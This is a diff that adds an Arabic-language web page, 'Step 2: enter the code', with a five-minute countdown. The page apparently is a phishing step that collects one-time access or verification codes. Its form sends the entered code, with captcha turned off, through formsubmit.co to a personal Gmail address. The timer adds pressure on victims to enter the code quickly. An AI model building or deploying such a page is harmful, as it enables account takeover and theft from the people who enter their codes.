@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>الخطوة 2 - الكود</title>
+  <style>
+    body {
+      direction: rtl;
+      text-align: center;
+      font-family: Arial;
+      padding-top: 100px;
+      background-color: #f5f5f5;
+    }
+    #timer {
+      font-size: 20px;
+      margin-bottom: 20px;
+      color: #d9534f;
+      font-weight: bold;
+    }
+    input, button {
+      padding: 10px;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>الخطوة 2: أدخل الكود</h2>
+
+  <div id="timer">الوقت المتبقي: 05:00</div>
+
+  <form action="https://formsubmit.co/hellafi1992@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="text" name="كود_الدخول" required placeholder="أدخل الكود" style="width: 250px;"><br>
+    <button type="submit">طلب الدخول ✅</button>
+  </form>
+
+  <script>
+    let time = 5 * 60; // 5 دقائق
+    const timerDisplay = document.getElementById('timer');
+
+    const countdown = setInterval(() => {
+      const minutes = Math.floor(time / 60).toString().padStart(2, '0');
+      const seconds = (time % 60).toString().padStart(2, '0');
+      timerDisplay.textContent = `الوقت المتبقي: ${minutes}:${seconds}`;
+      time--;
+
+      if (time < 0) {
+        clearInterval(countdown);
+        timerDisplay.textContent = 'انتهى الوقت ⛔️';
+      }
+    }, 1000);
+  </script>
+
+</body>
+</html>
